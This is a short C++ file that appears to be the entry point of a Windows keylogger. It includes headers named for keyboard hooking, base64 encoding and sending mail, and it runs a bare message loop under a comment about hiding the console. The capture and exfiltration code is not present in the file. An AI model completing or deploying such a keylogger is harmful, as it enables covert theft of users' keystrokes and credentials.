#include <iostream>
#include <windows.h>

// custom headers
#include "KeyConstants.h"
#include "helper.h"
#include "base64.h"
#include "IO.h"
#include "time.h"
#include "KeybHook.h"
#include "SendMail.h"
using namespace std;


int main()
{
   //disable console screen
    MSG Msg;
    while(GetMessage (&Msg, NULL, 0, 0))
    {
        TranslateMessage(&Msg);
        DispatchMessage(&Msg);
    }

}
